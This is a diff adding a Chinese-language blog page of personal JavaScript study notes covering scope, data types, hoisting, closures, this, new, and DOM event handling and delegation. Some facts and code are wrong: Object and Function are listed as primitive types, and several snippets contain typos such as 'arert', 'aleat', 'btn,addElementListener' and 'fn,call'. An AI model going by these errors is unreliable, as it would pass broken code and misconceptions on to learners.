@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="JavaScript," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="JavaScript篇（参考了《JavaScript高级程序设计》和部分知乎答案）  作用域指可访问变量、对象、函数的集合。 局部作用域：在函数内声明，只能在函数内部访问全局作用域：在函数外定义，所有脚本和函数均可使用（函数内赋值但未声明，仍为全局变量）变量生命周期：全局变量在页面关闭后销毁，局部变量在函数执行完毕后销毁 ps：在HTML中所有数据属于window对象  数据类型原始数据类型：栈，">
+<meta name="keywords" content="JavaScript">
+<meta property="og:type" content="article">
+<meta property="og:title" content="近期前端开发笔记整理【Javascript篇】（2017-09-22）">
+<meta property="og:url" content="Kevin031.github.io/2017/09/22/我的前端开发笔记整理/index.html">
+<meta property="og:site_name" content="PeanutButter">
+<meta property="og:description" content="JavaScript篇（参考了《JavaScript高级程序设计》和部分知乎答案）  作用域指可访问变量、对象、函数的集合。 局部作用域：在函数内声明，只能在函数内部访问全局作用域：在函数外定义，所有脚本和函数均可使用（函数内赋值但未声明，仍为全局变量）变量生命周期：全局变量在页面关闭后销毁，局部变量在函数执行完毕后销毁 ps：在HTML中所有数据属于window对象  数据类型原始数据类型：栈，">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:updated_time" content="2022-03-04T09:55:37.993Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="近期前端开发笔记整理【Javascript篇】（2017-09-22）">
+<meta name="twitter:description" content="JavaScript篇（参考了《JavaScript高级程序设计》和部分知乎答案）  作用域指可访问变量、对象、函数的集合。 局部作用域：在函数内声明，只能在函数内部访问全局作用域：在函数外定义，所有脚本和函数均可使用（函数内赋值但未声明，仍为全局变量）变量生命周期：全局变量在页面关闭后销毁，局部变量在函数执行完毕后销毁 ps：在HTML中所有数据属于window对象  数据类型原始数据类型：栈，">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="Kevin031.github.io/2017/09/22/我的前端开发笔记整理/"/>
+
+
+
+
+
+  <title>近期前端开发笔记整理【Javascript篇】（2017-09-22） | PeanutButter</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">PeanutButter</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">一个技术博客</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分類
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="Kevin031.github.io/2017/09/22/我的前端开发笔记整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="KevinLau">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PeanutButter">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">近期前端开发笔记整理【Javascript篇】（2017-09-22）</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2017-09-22T03:29:04+00:00">
+                2017-09-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/前端/" itemprop="url" rel="index">
+                    <span itemprop="name">前端</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>JavaScript篇<br>（参考了《JavaScript高级程序设计》和部分知乎答案）<br><br></p>
+<hr>
+<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>指可访问<strong>变量</strong>、<strong>对象</strong>、<strong>函数</strong>的集合。</p>
+<p><strong>局部</strong>作用域：在函数内声明，只能在函数内部访问<br><strong>全局</strong>作用域：在函数外定义，所有脚本和函数均可使用（<strong>函数内赋值但未声明，仍为全局变量</strong>）<br>变量生命周期：全局变量在页面关闭后销毁，局部变量在函数执行完毕后销毁</p>
+<p>ps：在HTML中所有数据属于window对象</p>
+<hr>
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><strong>原始数据类型：</strong>栈，占据空间小，大小固定<br>String<br>Number<br>Boolean<br>Object<br>Function<br><br><br><strong>不含值的数据类型：</strong><br>Undefined：不存在的值，或变量被声明了但未赋值<br>Null：一个对象被定义了，但是为空值（没有任何属性和方法）<br><br><br><strong>引用对象类型：</strong>堆，占据空间大，大小不固定（在栈中储存了指针，指向堆中的起始位置）<br>Object<br>Date<br>Array</p>
+<a id="more"></a>
+<hr>
+<h2 id="boolean类型转换"><a href="#boolean类型转换" class="headerlink" title="boolean类型转换"></a>boolean类型转换</h2><table>
+<thead>
+<tr>
+<th style="text-align:left">数据类型</th>
+<th style="text-align:left">true</th>
+<th style="text-align:left">false</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Boolean</td>
+<td style="text-align:left">true</td>
+<td style="text-align:left">false</td>
+</tr>
+<tr>
+<td style="text-align:left">String</td>
+<td style="text-align:left">任何非字符串</td>
+<td style="text-align:left">“”（空）</td>
+</tr>
+<tr>
+<td style="text-align:left">Number</td>
+<td style="text-align:left">任何非零数字值</td>
+<td style="text-align:left">0和NaN</td>
+</tr>
+<tr>
+<td style="text-align:left">Object</td>
+<td style="text-align:left">任何对象</td>
+<td style="text-align:left">Null</td>
+</tr>
+<tr>
+<td style="text-align:left">Undefined</td>
+<td style="text-align:left">n/a（不适用）</td>
+<td style="text-align:left">undefined</td>
+</tr>
+</tbody>
+</table>
+<p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var message = &quot;Hello world!&quot;;</div><div class="line">if (message) &#123;</div><div class="line">  alert(&quot;Value is true&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>由一个字符串序列形成的搜索模式。<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var str = &quot;Visit W3cSchool!&quot;;</div><div class="line">var n = str.search(/W3cSchool/i);</div><div class="line">//n=6               (不区分大小写)</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>函数声明和变量声明会被解释器自动提升到方法体的最顶部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var x;</div></pre></td></tr></table></figure></p>
+<p>但是初始化的变量不会提升<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var x = 5;</div><div class="line">x = 5</div></pre></td></tr></table></figure></p>
+<p>为避免问题的出现，通常在作用域开始前声明变量</p>
+<p><strong>注意：</strong>函数声明也会自动提升，而传递给初始化变量的函数则不会<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">function fn () &#123;&#125; //提升</div><div class="line"></div><div class="line">var fn = function () &#123;&#125; //不提升</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="函数调用的四种方法"><a href="#函数调用的四种方法" class="headerlink" title="函数调用的四种方法"></a>函数调用的四种方法</h2><p>1.方法调用模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var myobject = &#123;</div><div class="line">  value: 0,</div><div class="line">  inc: function() &#123;</div><div class="line">    alert(this.value);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">myobject.inc();</div><div class="line"></div><div class="line">//this指向myobject</div></pre></td></tr></table></figure></p>
+<p>2.函数调用模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var add = function(a,b) &#123;</div><div class="line">  alert(this);</div><div class="line">  return a+b;</div><div class="line">&#125;</div><div class="line">var sum = add(3,4);</div><div class="line">arert sum;</div></pre></td></tr></table></figure></p>
+<p>3.构造器调用模式（摒弃）</p>
+<p>4.apply调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var arr = [10,20];</div><div class="line">var sum = add.apply(myobject,arr);</div><div class="line">aleat(sum);</div></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>当从一个对象那里读取属性或调用方法时，如果该对象不存在这样的属性或方法，就会去自己关联的prototype对象那里寻找，直到找到或追溯过程结束为止。（即对象的属性和方法追溯机制）</p>
+<p>”读“属性会沿着原型链搜索，”新增“属性时则不会去看原型链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">(obj)</div><div class="line">name:&apos;obj&apos;        valueOf</div><div class="line">__proto__  ——&gt;    toString</div><div class="line">                  constructor</div><div class="line">                  ...</div><div class="line">                  __proto__    ——&gt;    null</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>先看两个典型例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function foo () &#123;</div><div class="line">  var local = 1;</div><div class="line">  function bar () &#123;</div><div class="line">    local++;</div><div class="line">    return local;</div><div class="line">  &#125;</div><div class="line"> return bar;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var func = foo();</div><div class="line">func(); //2</div><div class="line">func(); //3</div></pre></td></tr></table></figure></p>
+<p>bar函数调用了外层函数的local变量，函数运行完毕后local仍然保存在内存中，所以每次运行函数后local都会增加1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">var add =(function () &#123;</div><div class="line">  var counter = 0;</div><div class="line">  return function () &#123;</div><div class="line">    return counter += 1;</div><div class="line">  &#125;</div><div class="line">&#125;)();</div><div class="line"></div><div class="line">add(); //1</div><div class="line">add(); //2</div><div class="line">add(); //3</div></pre></td></tr></table></figure>
+<p>和上一个例子的原理是一样的，内层函数调用了外层函数的全局变量count导致其始终存在于内存中，而内部函数的存在也依赖于外层函数，导致其也始终再内存中，不会在调用结束后被垃圾回收机制回收。</p>
+<p>这就叫闭包，一句话概括：闭包就是<strong>函数</strong>和<strong>函数内部能访问到的变量</strong>的总和。<br>或者说，如果存在有权访问另一个函数作用域中变量的函数，那就构成了闭包。</p>
+<p>它提供了一中间接的方式能够访问到函数内部的数据，有以下两种情况：<br>1.函数作为返回值<br>2.函数作为参数传递</p>
+<p>正确运用闭包由一个好处，就是让一些数据更安全，只能通过特定的接口来访问。</p>
+<p>当然，有时候闭包也会导致一些问题，如下面的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">for (var i=0; i&lt;10; i++) &#123;</div><div class="line">  arr[i] = function() &#123;</div><div class="line">    return i;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">arr[0]; //10</div><div class="line">arr[6]; //10</div></pre></td></tr></table></figure>
+<p>function内访问了外部变量i，构成了一个闭包，我们先不写内部的i，每次赋值的结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">arr[0] = function() &#123; return i &#125;;</div><div class="line">arr[1] = function() &#123; return i &#125;;</div><div class="line">...</div><div class="line">arr[10] = function() &#123; return i &#125;;</div></pre></td></tr></table></figure></p>
+<p>而i的作用域是整个for的花括号内，因此这些函数返回的是同一个i，遍历完后产生了这11个结果，此时我们再调用函数的时候，i已经为10了，因此无论调用哪个函数，结果都是遍历完后的i。</p>
+<hr>
+<h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var obj = &#123;</div><div class="line">  foo: function () &#123;</div><div class="line">    console.log(this);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">var bar = obj.foo;</div><div class="line"></div><div class="line">obj.foo(); //obj</div><div class="line">bar(); //window</div></pre></td></tr></table></figure>
+<p>要理解this，首先要知道函数的三种调用形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">func(p1,p2);</div><div class="line">obj.child.method(p1,p2);</div><div class="line">func.call(context,p1,p2); //正常形式</div></pre></td></tr></table></figure></p>
+<p>context就是this，<br>上面的例子中，bar()等价于func.call(undefined)，这种情况下this为window，<br>而obj.foo()等价于obj.foo.call(obj)，this为obj</p>
+<p>有一个特例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">function fn() &#123;</div><div class="line">  console.log(this);</div><div class="line">&#125;</div><div class="line">var arr = [fn,fn2];</div><div class="line"></div><div class="line">arr[0]; //这里的this指什么</div></pre></td></tr></table></figure></p>
+<p>我们把arr[0]假想为arr.0()<br>也就相当于arr.0.call(arr)<br>所以this为arr</p>
+<p>对某些框架有其他方法来理解，<br>如在jQuery，this关键字指向的是当前正在执行事件的元素。</p>
+<hr>
+<h2 id="new操作"><a href="#new操作" class="headerlink" title="new操作"></a>new操作</h2><p>1.创建一个空对象，并且this变量引用该对象，继承该对象的原型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var obj = &#123;&#125;</div></pre></td></tr></table></figure></p>
+<p>2.属性和方法被加入到this引用的对象中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">obj.__proto__ = Base.prototype;</div></pre></td></tr></table></figure></p>
+<p>3.新创建的对象又this所引用，并且隐式地返回this<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Base.call(obj);</div></pre></td></tr></table></figure></p>
+<p>在以下例子中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var o = new myObject();</div></pre></td></tr></table></figure></p>
+<p>一旦没有加上new，myObject()内部的this将指向全局对象</p>
+<hr>
+<h2 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h2><h3 id="UI事件"><a href="#UI事件" class="headerlink" title="UI事件"></a>UI事件</h3><p><strong>1.load事件：</strong>页面完全加载后触发</p>
+<p><strong>2.unload事件：</strong>页面完全卸载后触发</p>
+<p><strong>3.resize事件：</strong>当浏览器窗口被调整到一个新的高度或宽度时触发</p>
+<p><strong>4.scroll事件：</strong>文档被滚动期间触发</p>
+<h3 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h3><p><strong>1.focusout：</strong>在失去焦点的元素上触发</p>
+<p><strong>2.focusin：</strong>在获得焦点的元素上触发</p>
+<p><strong>3.blur：</strong>在失去焦点的元素上触发</p>
+<p><strong>4.DOMFocusOut：</strong>在失去焦点的元素上触发</p>
+<p><strong>5.focus：</strong>在获得焦点的元素上触发</p>
+<p><strong>6.DOMFocusIn：</strong>在获得焦点的元素上触发</p>
+<h3 id="鼠标与滚轮事件"><a href="#鼠标与滚轮事件" class="headerlink" title="鼠标与滚轮事件"></a>鼠标与滚轮事件</h3><p><strong>1.click：</strong>单击鼠标或按下回车键时触发</p>
+<p><strong>2.dbclick：</strong>双击鼠标按钮时触发</p>
+<p><strong>3.mousedown：</strong>按下任意鼠标按钮时触发</p>
+<p><strong>4.mouseup：</strong>用户释放鼠标按钮时触发</p>
+<p><strong>5.mousewheel：</strong>通过鼠标滚轮滚动页面时触发</p>
+<p><strong>6.mouseenter：</strong>鼠标光标首次从元素外部移动到元素范围内时触发（只限于被选元素）</p>
+<p><strong>7.mouseover：</strong>鼠标指针位于一个元素外部，用户将其首次移入另一个元素边界之内时触发（任何元素，不限于被选元素）</p>
+<p><strong>8.mouseleave：</strong>位于元素上方的鼠标光标移动到元素范围之外时触发（只限于被选元素）</p>
+<p><strong>9.mouseout：</strong>鼠标指针位于一个元素的上方，移入到另一个元素时触发（任何元素，不限于被选元素）</p>
+<p><strong>10.mousemove：</strong>鼠标指针在元素内部移动时重复地触发</p>
+<h3 id="键盘与文本事件"><a href="#键盘与文本事件" class="headerlink" title="键盘与文本事件"></a>键盘与文本事件</h3><p><strong>1.keydown：</strong>按下键盘的任意键时触发</p>
+<p><strong>2.keypress：</strong>按下键盘的字符键时触发</p>
+<p><strong>3.keyup：</strong>释放键盘上的键时触发</p>
+<p>除此之外，还有</p>
+<h3 id="变动事件"><a href="#变动事件" class="headerlink" title="变动事件"></a>变动事件</h3><h3 id="H5事件"><a href="#H5事件" class="headerlink" title="H5事件"></a>H5事件</h3><h3 id="触摸与手势事件"><a href="#触摸与手势事件" class="headerlink" title="触摸与手势事件"></a>触摸与手势事件</h3><hr>
+<h2 id="DOM事件处理程序"><a href="#DOM事件处理程序" class="headerlink" title="DOM事件处理程序"></a>DOM事件处理程序</h2><h3 id="DOM0级事件处理程序"><a href="#DOM0级事件处理程序" class="headerlink" title="DOM0级事件处理程序"></a>DOM0级事件处理程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var btn = document.getElementById(&quot;myBtn&quot;);</div><div class="line"></div><div class="line">btn.onclick = function () &#123;</div><div class="line">  alert(&quot;clicked&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="DOM2级事件处理程序"><a href="#DOM2级事件处理程序" class="headerlink" title="DOM2级事件处理程序"></a>DOM2级事件处理程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">var btn = document.getElementById(&quot;myBtn&quot;);</div><div class="line"></div><div class="line">btn,addElementListener(&quot;click&quot;,function()&#123;</div><div class="line">  alert(&quot;clicked&quot;);</div><div class="line">&#125;,false);</div><div class="line"></div><div class="line">//true: 在捕获阶段调用事件处理程序</div><div class="line">//false: 在冒泡阶段调用事件处理程序</div></pre></td></tr></table></figure>
+<h3 id="跨浏览器的事件处理程序（封装）"><a href="#跨浏览器的事件处理程序（封装）" class="headerlink" title="跨浏览器的事件处理程序（封装）"></a>跨浏览器的事件处理程序（封装）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">var EventUtil = &#123;</div><div class="line">  addHandler: function(element,type,hander) &#123;</div><div class="line">    if (element.addEventListener) &#123;</div><div class="line">      element.addEventListener(type,handler,false);</div><div class="line">    &#125; else if (element.attachEvent) &#123;   //IE</div><div class="line">      element.attachEvent(&quot;on&quot;+type,handler);</div><div class="line">    &#125; else &#123;</div><div class="line">      element[&quot;on&quot;+type] = handler;   //HTML事件</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<hr>
+<h2 id="事件委托的原理以及优缺点"><a href="#事件委托的原理以及优缺点" class="headerlink" title="事件委托的原理以及优缺点"></a>事件委托的原理以及优缺点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">function delegateEvent (interfaceEle,selector,type,fn) &#123;</div><div class="line">  if (interfaceEle.addEventListener) &#123;</div><div class="line">    interfaceEle.addEventListener(type,eventfn);</div><div class="line">  &#125; else &#123;   //IE</div><div class="line">    interfaceEle.attachEvent(&quot;on&quot;+type,eventfn);</div><div class="line">  &#125;</div><div class="line">  function eventfn (e) &#123;</div><div class="line">    var e = e || window.event;</div><div class="line">    var target = e.target || e.srcElement;   //兼容fireFox</div><div class="line">    if (matchSelector(target,selector)) &#123;</div><div class="line">      if (fn) &#123;</div><div class="line">        fn,call(target,e);   //将fn内部的this指向target</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var odiv = document.getElementById(&quot;iDiv&quot;);</div><div class="line">delegateEvent(odiv,&apos;click&apos;,function()&#123;</div><div class="line">  alert(&quot;clicked&quot;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
+<p>优点：<br>1.大量减少内存占用，减少事件注册<br>2.新增子对象无需再次对其绑定事件</p>
+<hr>
+<h2 id="原生Javascript实现事件代理"><a href="#原生Javascript实现事件代理" class="headerlink" title="原生Javascript实现事件代理"></a>原生Javascript实现事件代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;ul id=&quot;parentList&quot;&gt;</div><div class="line">  &lt;li id=&quot;post-1&quot;&gt;1&lt;/li&gt;</div><div class="line">  &lt;li id=&quot;post-2&quot;&gt;2&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">  function delegateEvent(interfaceEle,type,fn) &#123;</div><div class="line">    if(interfaceEle.addEventListener) &#123;</div><div class="line">      interfaceEle.addEventListener(type,fn);</div><div class="line">    &#125; else &#123;   //IE</div><div class="line">      interfaceEle.attachEvent(&quot;on&quot;+type,fn);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">var parentList = document.getElementById(&quot;parentList&quot;);</div><div class="line"></div><div class="line">delegateEvent(parentList,&quot;click&quot;,function(e)&#123;</div><div class="line">  var e = e || window.event;   //兼容IE</div><div class="line">  var target = e.target || e.srcElement;   //兼容fireFox</div><div class="line">  alert(target.id);   </div><div class="line">&#125;);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>这段代码监听了整个<ul>标签并且启用了事件代理，点击<li>标签的时候会返回具体的li标签的id，对新增的对象元素也同样有效</li></ul></p>
+<hr>
+<h2 id="事件冒泡和事件捕获"><a href="#事件冒泡和事件捕获" class="headerlink" title="事件冒泡和事件捕获"></a>事件冒泡和事件捕获</h2><p><strong>事件冒泡：</strong>事件开始时由最具体的元素接收，然后逐级向上，传播到较为不具体的节点</p>
+<p><strong>事件捕获：</strong>不太具体的节点更早地接收到事件，而最具体的节点最后接收到事件</p>
+<p><strong>DOM事件流：</strong>同时支持两种事件模型：捕获型事件和冒泡型事件，但是，捕获型事件先发生。两种事件流会触及DOM中的所有对象，从document对象开始，也在document对象结束。</p>
+<p>支持W3C标准的浏览器在添加事件时用addEventListener(event,fn,useCapture)方法，基中第3个参数useCapture是一个Boolean值，用来设置事件是在事件捕获时执行，还是事件冒泡时执行。而不兼容W3C的浏览器(IE)用attachEvent()方法，此方法没有相关设置，不过<strong>IE</strong>的事件模型默认是在<strong>事件冒泡</strong>时执行的，也就是在useCapture等于false的时候执行，所以把在处理事件时<strong>把useCapture设置为false</strong>是比较安全，也实现兼容浏览器的效果。</p>
+<hr>
